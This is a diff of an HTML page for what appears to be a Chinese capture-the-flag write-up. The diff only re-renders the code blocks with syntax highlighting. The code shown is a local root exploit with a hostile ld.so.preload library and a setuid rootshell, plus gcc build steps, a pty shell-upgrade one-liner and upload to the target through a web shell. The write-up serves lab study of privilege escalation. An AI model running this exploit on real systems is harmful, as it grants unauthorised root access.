@@ -475,7 +475,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    800
+                    793
                 </div>
                 
 
@@ -534,28 +534,31 @@ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;         //实现
 <p>copy一手41154.sh，再cat一下，（41154.sh是不能直接进行编译的）</p>
 <p>这里我看了很wp最后发现是需要我们创建两个c语言文件，然后将这两个文件进行编译之后产生的新文件通过蚁剑上传到靶机，其中libhax.c的代码如下：</p>
 <p><a href="https://imgchr.com/i/BvVjJS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVjJS.png" alt></a></p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-__attribute__ ((__constructor__))
-void dropshell(void){
-    chown(&quot;/tmp/rootshell&quot;, 0, 0);
-    chmod(&quot;/tmp/rootshell&quot;, 04755);
-    unlink(&quot;/etc/ld.so.preload&quot;);
-    printf(&quot;[+] done!\n&quot;);
-}</code></pre><p>然后命令行上执行：</p>
+<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>然后命令行上执行：</p>
 <p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
 <p>rootshell.c的代码如下：</p>
 <p><a href="https://imgchr.com/i/BvZ9Ln" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZ9Ln.png" alt></a></p>
-<pre class=" language-#include"><code class="language-#include">int main(void){
-    setuid(0);
-    setgid(0);
-    seteuid(0);
-    setegid(0);
-    execvp("/bin/sh", NULL, NULL);
-}</code></pre>
+<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
 <p>然后执行以下命令：</p>
-<pre><code>gcc -o rootshell rootshell.c</code></pre><p>注意：这两个文件一定要进行编译，而在进行编译之后会产生两个同名的文件，而我们真正的提权工具就是这两个新产生的文件。</p>
+<p><code>gcc -o rootshell rootshell.c</code></p>
+<p>注意：这两个文件一定要进行编译，而在进行编译之后会产生两个同名的文件，而我们真正的提权工具就是这两个新产生的文件。</p>
 <p>然后将两个文件通过蚁剑上传到靶机上的/tmp下，</p>
 <p><a href="https://imgchr.com/i/BvZid0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZid0.png" alt></a></p>
 <p>然后在我们的交互式shell窗口cd到/tmp/etc下执行以下命令：</p>
